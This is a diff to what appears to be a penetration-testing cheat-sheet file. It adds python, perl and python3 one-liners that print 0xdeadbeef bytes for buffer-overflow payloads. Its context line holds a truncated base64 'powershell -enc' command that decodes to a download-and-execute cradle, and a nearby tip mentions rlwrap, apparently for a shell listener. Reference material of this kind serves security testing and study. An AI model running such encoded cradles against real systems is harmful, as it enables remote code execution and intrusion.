@@ -2212,3 +2212,20 @@ powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwA
 # TIPS: rlwrap, for pseudo historic and move with arrows
 
 """
+
+
+######################################
+######################################
+
+python_encrypt_buffer_over_flow = create_new_cheat("Print special char for buffer overflow with python3 - 0xdeadbeef")
+python_encrypt_buffer_over_flow.category = "Python"
+python_encrypt_buffer_over_flow.sub_category = "Encoding"
+python_encrypt_buffer_over_flow.output = """[*] Print special char for buffer overflow with python3 - 0xdeadbeef
+
+
+python2 -c 'print(b"\\xef\\xbe\\xad\\xde")' | xxd
+perl -e 'print "\\xef\\xbe\\xad\\xde\\n"' | xxd
+python3 -c 'import sys;sys.stdout.buffer.write(b"\\xef\\xbe\\xad\\xde\\n")' | xxd
+
+
+"""
